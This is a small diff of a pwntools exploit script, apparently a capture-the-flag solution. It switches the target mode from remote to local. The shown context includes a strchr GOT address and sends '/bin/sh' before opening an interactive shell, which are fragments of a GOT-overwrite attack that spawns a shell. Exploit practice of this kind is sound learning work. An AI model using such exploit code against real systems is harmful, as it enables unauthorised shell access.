@@ -2,7 +2,7 @@
 
 from pwn import *
 
-MODE = 'r'
+MODE = 'l'
 DEBUG = True
 
 strchr_got = 0x602038
@@ -89,5 +89,4 @@ p.sendline('y')
 p.sendline("/bin/sh")
 
 p.interactive()
-
 p.close()
